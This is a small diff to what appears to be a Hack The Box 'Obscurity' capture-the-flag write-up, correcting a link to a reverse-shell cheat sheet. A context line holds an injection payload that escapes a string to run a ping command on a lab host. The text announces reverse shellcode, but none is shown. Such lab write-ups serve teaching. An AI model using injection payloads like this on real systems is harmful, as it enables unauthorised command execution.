@@ -76,7 +76,7 @@ path = '\'' + '\nimport os;os.system("ping -c 2 10.10.15.95")\na=\''
 
 ![Image](assets/img/writeups/hackthebox/obscurity/image-17.png)
 
-So all we need to do to get the reverse shell is to place some Python reverse shellcode [pentest monkey reverse shell cheat sheet](https://google.com).
+So all we need to do to get the reverse shell is to place some Python reverse shellcode (Credit to) [pentest monkey reverse shell cheat sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
 
 ```py
 #!/usr/bin/env python3
